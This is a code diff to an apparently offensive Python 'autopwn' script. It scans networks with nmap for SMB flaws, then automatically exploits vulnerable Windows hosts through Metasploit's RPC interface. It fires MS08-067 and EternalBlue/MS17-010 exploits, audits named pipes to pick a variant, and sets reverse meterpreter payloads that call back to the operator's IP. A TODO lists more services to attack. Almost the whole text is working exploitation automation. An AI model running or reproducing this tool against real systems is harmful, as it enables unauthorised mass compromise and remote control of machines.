@@ -39,12 +39,11 @@ def print_good(msg):
 def print_great(msg):
     print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))
 
-def keep_alive(args):
+def keep_alive(args, lock):
     '''
     msfrpc will kill auth tokens after 5m
     '''
     global CLIENT
-    lock = Lock()
 
     last_check = time.time()
     while True:
@@ -106,7 +105,7 @@ def nmap_scan(hosts):
     Do Nmap scan
     '''
     #nmap_args = '-sS -T4 -sV -n --max-retries 5 -oA autopwn-scan'
-    nmap_args = '-sS -T4 -sV -n --max-retries 5 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA autopwn-scan'
+    nmap_args = '-sS -O -T4 -sV -n --max-retries 5 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA autopwn-scan'
     nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
     rc = nmap_proc.sudo_run_background()
     nmap_status_printer(nmap_proc)
@@ -131,26 +130,35 @@ def nmap_status_printer(nmap_proc):
 
 def get_hosts(report):
     '''
-    Gets list of hosts with port 445 or 3268 (to find the DC) open
-    and a list of hosts with smb signing disabled
+    Prints host data
     '''
-    hosts = {}
+    hosts = []
 
     print_info('Parsing hosts')
     for host in report.hosts:
         if host.is_up():
             ip = host.address
-            print_info('Host up: {}'.format(ip))
+            nmap_os_raw = host.os_class_probabilities()
+
+            if len(nmap_os_raw) > 0:
+                nmap_os = str(nmap_os_raw[0]).split(':')[1].split('\r\n')[0].strip()
+            else:
+                # Default to Windows
+                nmap_os = 'Windows'
+
+            print_info('{} - {}'.format(ip, nmap_os))
             for s in host.services:
                 if s.open():
-                    banner = s.banner.split('product: ')[1]
+
+                    if host not in hosts:
+                        hosts.append(host)
+
+                    if 'product: ' in s.banner:
+                        banner = s.banner.split('product: ')[1]
+                    else:
+                        banner = s.banner
                     port = str(s.port)
                     print '          {} - {}'.format(port, banner)
-                    port_banner = [(port, banner)]
-                    if hosts.get(ip):
-                        hosts[ip] += port_banner
-                    else:
-                        hosts[ip] = port_banner
 
     if len(hosts) == 0:
         print_bad('No hosts found')
@@ -158,111 +166,256 @@ def get_hosts(report):
 
     return hosts
 
-def get_smb_vuln_hosts(report):
+def check_named_pipes(c_id, ip, nmap_os):
     '''
-    Parse NSE scripts to find vulnerable hosts
+    If we can avoid EternalBlue we will because EternalRomance/Synergy
+    works on more versions of Windows
+    If we can get a named pipe then we'll use Romance/Synergy over Blue
     '''
-    vuln_hosts = {}
-    nse_scripts = ['smb-vuln-ms17-010', 'smb-vuln-ms08-067']
-
-    for host in report.hosts:
-        ip = host.address
-
-        for script_out in host.scripts_results:
-            for script in nse_scripts:
-                if script_out['id'] == script:
-                    if 'State: VULNERABLE' in script_out['output']:
-                        print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
-                        if vuln_hosts.get(ip):
-                            vuln_hosts[ip].append(script)
-                        else:
-                            vuln_hosts[ip] = [script]
-
-    return vuln_hosts
-
-def get_smb_cmds(smb_vuln_hosts):
-    all_ms17_cmds = []
-    all_ms08_cmds = []
-
+    pipes = None
+    pipe_audit_path = 'auxiliary/scanner/smb/pipe_auditor'
+    rhost_var = 'RHOSTS'
     port = '445'
+    extra_opts = ''
+    payload = get_payload(pipe_audit_path, nmap_os)
+    pipe_auditor_cmd = create_msf_cmd(pipe_audit_path, rhost_var, ip, port, payload, extra_opts)
+    output = get_module_output(c_id, pipe_auditor_cmd)
 
-    ms17_path = 'exploit/windows/smb/ms17_010_eternalblue'
-    ms17_rhost_var = 'RHOST'
-    ms17_opts = 'set MaxExploitAttempts 6\n'
-
-
-    ms08_path = 'exploit/windows/smb/ms08_067_netapi'
-    ms08_rhost_var = 'RHOST'
-
-    for ip in smb_vuln_hosts:
-        for script in smb_vuln_hosts[ip]:
-            if script == 'smb-vuln-ms17-010':
-                ms17_cmd = create_msf_cmd(ms17_path, ms17_rhost_var, ip, port, ms17_opts)
-                all_ms17_cmds.append(ms17_cmd)
-            elif script == 'smb-vuln-ms08-067':
-                ms08_cmd = create_msf_cmd(ms08_path, ms08_rhost_var, ip, port, '')
-                all_ms08_cmds.append(ms08_cmd)
-
-    return all_ms17_cmds, all_ms08_cmds
-
-def create_msf_cmd(exploit_path, rhost_var, ip, port, extra_opts):
+    # Example output:
     '''
-    1. exploit path
-    2. RHOST/RHOSTS
-    3. IP
-    4. port
-    5. extra options
+    ['RHOSTS => 192.168.243.129',
+       '[*] 192.168.243.129:445   - Pipes: \\netlogon, \\lsarpc, \\samr, \\atsvc, \\epmapper, \\eventlog, \\InitShutdown, \\lsass, \\LSM_API_service, \\ntsvcs, \\protected_storage, \\scerpc, \\srvsvc, \\W32TIME_ALT, \\wkssvc',
+       '[*] Scanned 1 of 1 hosts (100% complete)',
+       '[*] Auxiliary module execution completed']
     '''
+
+    for l in output:
+        delim = 'Pipes: '
+        if delim in l:
+            pipes = l.split(delim)[1].split(', ')
+            print pipes #1111
+
+    return pipes
+
+def get_iface():
+    '''
+    Gets the right interface for Responder
+    '''
+    try:
+        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+    except:
+        ifaces = []
+        for iface in netifaces.interfaces():
+            # list of ipv4 addrinfo dicts
+            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
+
+            for entry in ipv4s:
+                addr = entry.get('addr')
+                if not addr:
+                    continue
+                if not (iface.startswith('lo') or addr.startswith('127.')):
+                    ifaces.append(iface)
+
+        iface = ifaces[0]
+
+    return iface
+
+def get_local_ip(iface):
+    '''
+    Gets the the local IP of an interface
+    '''
+    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
+    return ip
+
+def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
+    '''
+    You can set arbitrary options that don't get used which is why we autoinclude
+    ExitOnSession True; even if we use aux module this just won't do anything
+    '''
+    local_ip = get_local_ip(get_iface())
     cmds = """
            use {}\n
            set {} {}\n
-           set PORT {}\n
-           {}
-           set ExitOnSession True
+           set RPORT {}\n
+           set LHOST {}\n
+           set payload {}\n
+           {}\n
+           set ExitOnSession True\n
            exploit -z\n
-           """.format(exploit_path, rhost_var, ip, port, extra_opts)
+           """.format(module_path, rhost_var, ip, port, local_ip, payload, extra_opts)
 
     return cmds
 
-def exploit_smb(c_id, smb_vuln_hosts):
+def get_module_output(c_id, cmd):
     '''
-    Exploits ms08-067 and ms17-010
+    Runs module and gets output
     '''
-    ms17_cmds, ms08_cmds = get_smb_cmds(smb_vuln_hosts)
-    if len(ms17_cmds) > 0:
-        for cmd in ms17_cmds:
+    #wait_on_busy_console(c_id)
+    #clear console output buffer
+    #print CLIENT.call('console.read', [c_id])
+    CLIENT.call('console.write',[c_id, cmd])
+    wait_on_busy_console(c_id)
+    output = CLIENT.call('console.read', [c_id])['data'].splitlines()
 
-            # Make sure the console is not busy
-            while CLIENT.call('console.read', [c_id])['busy'] == True:
-                time.sleep(1)
+    return output
 
-            CLIENT.call('console.write',[c_id, cmd])
+def get_payload(module, nmap_os):
+    '''
+    Automatically get compatible payloads
+    '''
+    payload = None
+    win_payloads = ['windows/meterpreter/reverse_https',
+                    'windows/x64/meterpreter/reverse_https',
+                    'java/meterpreter/reverse_https',
+                    'java/jsp_shell_reverse_tcp']
 
-    if len(ms08_cmds) > 0:
-        for cmd in ms08_cmds:
+    unix_payloads = ['java/meterpreter/reverse_https',
+                     'java/jsp_shell_reverse_tcp',
+                     'cmd/unix/reverse']
 
-            # Make sure the console is not busy
-            while CLIENT.call('console.read', [c_id])['busy'] == True:
-                time.sleep(1)
+    payloads = CLIENT.call('module.compatible_payloads',[module])
 
-            CLIENT.call('console.write',[c_id, cmd])
+    if payloads.get('error'):
+        if 'auxiliary' not in module:
+            print_bad('Error getting payload for {}'.format(module))
+        else:
+            # For aux modules we just set an arbitrary real payload
+            payload = win_payloads[0]
+    else:
+        payloads = payloads['payloads']
+
+    # Set a preferred payload based on OS
+    if 'windows' in nmap_os.lower():
+        for p in win_payloads:
+            if p in payloads:
+                payload = p
+    elif 'nix' in nmap_os.lower():
+        for p in win_payloads:
+            if p in payloads:
+                payload = p
+
+    # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
+    if payload == None:
+        if 'auxiliary' not in module:
+            print_bad('No preferred payload found, here\'s what was found:')
+            for p in payloads:
+                print '    '+p
+            print_info('Setting payload to {} and continuing'.format(win_payloads[0]))
+
+        payload = win_payloads[0]
+
+    return payload
+
+
+def check_nse_vuln_scripts(host, script):
+    '''
+    Check if host if vulnerable via nse script
+    '''
+    ip = host.address
+    for script_out in host.scripts_results:
+        if script_out['id'] == script:
+            if 'State: VULNERABLE' in script_out['output']:
+                print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
+                return True
+
+    return False
+
+def run_exploits(c_id, host):
+    '''
+    Checks for exploitable services on a host
+    '''
+    # First check for ms08_067 and ms17_010
+    ms08_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms08-067')
+    ms17_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms17-010')
+    if ms08_vuln == True:
+        output = run_ms08(c_id, host)
+    if ms17_vuln == True:
+        output = run_ms17(c_id, host)
+
+def print_module_output(output, module):
+    print_info('{} output:'.format(module))
+    for l in output:
+        print '    '+l.strip()
+
+def run_ms08(c_id, host):
+    '''
+    Exploit ms08_067
+    '''
+    ip = host.address
+    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
+    port = '445'
+    ms08_path = 'exploit/windows/smb/ms08_067_netapi'
+    ms08_rhost_var = 'RHOST'
+    ms08_opts = ''
+    ms08_payload = get_payload(ms08_path, nmap_os)
+    ms08_cmd = create_msf_cmd(ms08_path, ms08_rhost_var, ip, port, ms08_payload, ms08_opts)
+    output = get_module_output(c_id, ms08_cmd)
+    print_module_output(output, ms08_path)
+
+    return output
+
+def run_ms17(c_id, host):
+    '''
+    Exploit ms17_010
+    '''
+    ip = host.address
+    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
+    port = '445'
+
+    # Check for named pipe availability (preVista you could just grab em)
+    # If we find one, then use Romance/Synergy instead of Blue
+    named_pipe = None
+    named_pipes = check_named_pipes(c_id, ip, nmap_os)
+    # Just use the first named pipe
+    if named_pipes:
+        named_pipe = named_pipes[0]
+
+    ms17_rhost_var = 'RHOST'
+
+    if named_pipe:
+        ms17_path = 'exploit/windows/smb/ms17_010_psexec'
+        ms17_opts = 'set NAMEDPIPE {}'.format(named_pipe)
+    else:
+        ms17_path = 'exploit/windows/smb/ms17_010_eternalblue'
+        ms17_opts = ''
+
+    ms17_payload = get_payload(ms17_path, nmap_os)
+
+    ms17_cmd = create_msf_cmd(ms17_path, ms17_rhost_var, ip, port, ms17_payload, ms17_opts)
+
+    output = get_module_output(c_id, ms17_cmd)
+    print_module_output(output, ms17_path)
+    return output
+
+def wait_on_busy_console(c_id):
+    '''
+    The only way to get console busy status is through console.read or console.list
+    console.read clears the output buffer so you gotta use console.list
+    but console.list requires you know the list offset of the c_id console
+    so this ridiculous list comprehension seems necessary to avoid assuming
+    what the right list offset might be
+    '''
+    list_offset = int([x['id'] for x in CLIENT.call('console.list')['consoles'] if x['id'] is c_id][0])
+    while CLIENT.call('console.list')['consoles'][list_offset]['busy'] == True:
+        time.sleep(1)
 
 def main(report, args):
     global CLIENT
+
+    lock = Lock()
 
     # hosts will only be populated with ips that have open ports
     # hosts = {ip : [(port, banner), (port2, banner2)]
     hosts = get_hosts(report)
 
-    # these are in format {ip:[ms08-nse, ms17-nse]}
-    smb_vuln_hosts = get_smb_vuln_hosts(report)
-
-
     # initialize keep alive process
-    p = Thread(target=keep_alive, args=(args,))
+    # won't attempt first login until 100s from start
+    p = Thread(target=keep_alive, args=(args, lock))
+    p.setDaemon(True)
     p.start()
 
     CLIENT.login(args.username, args.password)
+
     c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
 
     if len(c_ids) == 0:
@@ -272,10 +425,8 @@ def main(report, args):
     # Get the latest console
     c_id = c_ids[-1]
 
-    #Exploit ms08/17
-    exploit_smb(c_id, smb_vuln_hosts)
-
-    embed()
+    for host in hosts:
+        run_exploits(c_id, host)
 
 if __name__ == "__main__":
     args = parse_args()
@@ -285,4 +436,7 @@ if __name__ == "__main__":
     report = parse_nmap(args)
     main(report, args)
 
-
+#TODO
+# Add JBoss, Struts, Tomcat, Jenkins, WebSphere
+# Why are named pipes printing twice?
+# Why can't I accurately read module output?
